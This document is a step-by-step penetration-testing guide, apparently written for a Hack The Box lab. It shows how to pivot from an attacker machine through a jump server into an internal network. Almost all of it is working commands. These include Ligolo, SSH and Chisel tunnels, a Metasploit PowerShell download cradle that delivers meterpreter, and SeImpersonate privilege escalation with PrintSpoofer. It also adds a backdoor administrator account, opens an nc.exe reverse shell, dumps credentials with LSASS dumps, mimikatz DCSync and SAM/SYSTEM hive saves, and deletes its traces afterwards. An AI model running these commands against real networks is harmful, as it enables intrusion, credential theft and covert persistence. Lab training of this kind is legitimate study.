 # Complete Pivoting Guide: External Parrot OS → Jump Server → Internal Network

## Scenario
- **Parrot OS** (Attacker): External network, IP `10.10.15.70`
- **Jump Server**: Dual-homed, external IP `10.10.14.5`, internal IP `172.16.7.240`
- **Internal Network**: `172.16.7.0/24` (not directly accessible from Parrot)
- **Goal**: Full bidirectional pivoting for scanning, exploitation, and callbacks

---

## Phase 1: Initial Access & Ligolo Setup

### 1.1 — SSH into Jump Server

```bash
ssh htb-student@10.10.14.5
```

### 1.2 — Check Jump Server Interfaces

```bash
ip addr
# or
ifconfig

# Expected output:
# eth0: 10.10.14.5 (external)
# eth1: 172.16.7.240 (internal)
```

### 1.3 — Transfer Ligolo Agent to Jump Server

**On Parrot OS** (start HTTP server):
```bash
cd /opt/ligolo
python3 -m http.server 80
```

**On Jump Server** (download agent):
```bash
cd /tmp
wget http://10.10.15.70/ligolo-agent
chmod +x ligolo-agent
```

---

## Phase 2: Ligolo Proxy (Attacker Side)

### 2.1 — Start Ligolo Proxy on Parrot OS

```bash
cd /opt/ligolo
sudo ./proxy -selfcert
# or with your own certs:
# sudo ./proxy -laddr 0.0.0.0:11601 -cert server.crt -key server.key
```


---

## Phase 3: Agent Connection (Jump Server Side)

### 3.1 — Connect Agent to Proxy

```bash
./ligolo-agent -connect 10.10.15.70:11601 -ignore-cert
```

### 3.2 — In Ligolo Proxy — Select Session

```bash
# Ligolo proxy shows:
# [Agent] agent connected from 10.10.14.5:54321

# Select the session
session
# Choose the session number (e.g., 1)
```

### 3.3 — Route Internal Network Through Ligolo

```bash
# In ligolo-proxy, after selecting session:
autoroute
```

### 3.4 — Verify Routing

```bash
# On Parrot OS
ping 172.16.7.1
nmap -sn 172.16.7.0/24
```

---

## Phase 4: Reverse Port Forwarding (Internal → Parrot)

Internal machines can't reach Parrot directly. Use Ligolo listeners.

### 4.1 — Forward Reverse Shell Port

**In ligolo-proxy** (with session selected):
```bash
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

Now `172.16.7.240:4444` → `10.10.15.70:4444`

### 4.2 — Forward HTTP/HTTPS for File Transfers

```bash
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp
listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:443 --tcp
```

Now internal machines can:
```bash
curl http://172.16.7.240:8080/payload.exe
wget http://172.16.7.240:8080/file.txt
```

### 4.3 — List Active Listeners

```bash
listeners_list
```

### 4.4 — Remove a Listener

```bash
listener_del --addr 0.0.0.0:4444
```

---

## Phase 5: MSF Web Delivery with Ligolo

### 5.1 — Configure Exploit

```msf
use exploit/multi/script/web_delivery
set SRVHOST 0.0.0.0
set SRVPORT 8080
set LHOST 172.16.7.240        # Jump server internal IP (what victim sees)
set LPORT 4444                # Must match Ligolo listener
set payload windows/x64/meterpreter/reverse_tcp
set target 2                  # PSH (PowerShell)
run
```

### 5.2 — Ensure Ligolo Listeners Are Active

```bash
# In ligolo-proxy
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:8080 --tcp
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```

### 5.3 — Victor Executes Payload

On internal Windows machine:
```powershell
powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).downloadString('http://172.16.7.240:8080/...')"
```

**Traffic flow:**
1. Victim → `172.16.7.240:8080` (Jump Server) → Ligolo → Parrot `8080` (MSF Web Server)
2. Victim → `172.16.7.240:4444` (Jump Server) → Ligolo → Parrot `4444` (MSF Handler)
3. Meterpreter session established on Parrot!

---

## Phase 6: Alternative — SSH Reverse Tunnel (No Ligolo)

If Ligolo fails or you prefer SSH:

### 6.1 — Create Reverse Tunnel from Parrot

```bash
# Bind jump-server:8080 → parrot:80
# Bind jump-server:4444 → parrot:4444
ssh -R '*:8080:localhost:80' -R '*:4444:localhost:4444' htb-student@10.10.14.5
```

### 6.2 — If SSH Refuses Wildcard Binding

Edit `/etc/ssh/sshd_config` on jump server:

```bash
GatewayPorts yes
sudo systemctl restart ssh
```

Or use socat workaround:

```bash
# On jump server
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:8080
socat TCP-LISTEN:4444,fork TCP:127.0.0.1:4444
```

---

## Phase 7: Chisel Alternative (More Flexible)

### 7.1 — Chisel Server on Parrot

```bash
chisel server -p 8080 --reverse
```

### 7.2 — Chisel Client on Jump Server

```bash
chisel client 10.10.15.70:8080 R:0.0.0.0:4444:127.0.0.1:4444 R:0.0.0.0:8080:127.0.0.1:80
```

---

## Phase 8: Post-Exploitation — Dumping Credentials

### 8.1 — Check Privileges

```cmd
whoami /priv
whoami /groups
```

### 8.2 — SeImpersonatePrivilege Exploitation

```cmd
# Download PrintSpoofer or GodPotato
certutil -urlcache -split -f http://172.16.7.240:8080/PrintSpoofer64.exe C:\Windows\Temp\PS.exe

# Execute as SYSTEM
C:\Windows\Temp\PS.exe -i -c "whoami"

# Add admin user
C:\Windows\Temp\PS.exe -i -c "net user hax P@ssw0rd123! /add && net localgroup administrators hax /add"

# Reverse shell
C:\Windows\Temp\PS.exe -i -c "C:\Windows\Temp\nc.exe 172.16.7.240 4444 -e cmd"
```

### 8.3 — Dump LSASS (If Not Protected)

```cmd
# Using nanodump
nanodump.exe --write C:\Windows\Temp\lsass.dmp

# Transfer to Parrot and parse
pypykatz lsa minidump lsass.dmp
```

### 8.4 — If LSASS Protected (Credential Guard/RunAsPPL)

```cmd
# Try sekurlsa::tickets
mimikatz "privilege::debug" "sekurlsa::tickets /export" "exit"

# Try DCSync if on DC
mimikatz "lsadump::dcsync /domain:corp.local /all" "exit"

# Dump SAM/SYSTEM
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
```

---

## Phase 9: BloodHound Data Collection

### 9.1 — Via NXC with Ligolo Route

```bash
# On Parrot OS (route already added via Ligolo)
nxc ldap 172.16.7.3 -u user -p pass --bloodhound --collection all --dns-server 172.16.7.3
```

### 9.2 — If DNS Fails

```bash
# Add to /etc/hosts on Parrot
echo "172.16.7.3 DC01.corp.local DC01 corp.local" | sudo tee -a /etc/hosts

# Or specify domain explicitly
nxc ldap 172.16.7.3 -u user -p pass -d corp.local --bloodhound --collection all
```

---

## Phase 10: Cleanup

### 10.1 — Remove Ligolo Route

```bash
sudo ip route del 172.16.7.0/24 dev ligolo
```

### 10.2 — Stop Ligolo Proxy

```bash
# In ligolo-proxy
stop
exit
```

### 10.3 — Kill SSH Tunnels

```bash
# Find and kill
ps aux | grep ssh
kill <pid>
```

### 10.4 — Remove Files from Jump Server

```bash
rm /tmp/ligolo-agent
rm /tmp/*.exe
rm /tmp/*.dmp
```

---

## Quick Reference: Common Commands

| Task | Command |
|---|---|
| Add route | `sudo ip route add 172.16.7.0/24 dev ligolo` |
| Forward port | `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp` |
| List listeners | `listeners_list` |
| Remove listener | `listener_del --addr 0.0.0.0:4444` |
| SSH reverse tunnel | `ssh -R '*:8080:localhost:80' user@jump` |
| Check listeners | `netstat -tlnp` (jump server) |
| Verify pivot | `nmap -sn 172.16.7.0/24` from Parrot |

---

## Troubleshooting

| Issue | Solution |
|---|---|
| `failed to open display` | Use SSH `-X` or `xvfb-run` |
| `Could not find domain controller` | Add `-d domain.local --dns-server <ip>` |
| `Handler failed to bind` | Set `SRVHOST 0.0.0.0`, `LHOST` to jump internal IP |
| `Key import` error in Mimikatz | Use `nanodump` + `pypykatz` or try `sekurlsa::tickets` |
| Ligolo agent won't connect | Check firewall, use `-ignore-cert`, verify proxy IP |
| Internal can't reach Parrot | Verify `listener_add` is active, check `listeners_list` |

---

## Tools & Downloads

| Tool | Purpose | URL |
|---|---|---|
| Ligolo | Layer 3 pivoting | github.com/nicocha30/ligolo |
| Chisel | TCP tunneling | github.com/jpillora/chisel |
| PrintSpoofer | SeImpersonate privesc | github.com/itm4n/PrintSpoofer |
| GodPotato | Modern potato exploit | github.com/BeichenDream/GodPotato |
| nanodump | LSASS dump | github.com/helpsystems/nanodump |
| pypykatz | Offline credential parser | github.com/skelsec/pypykatz |
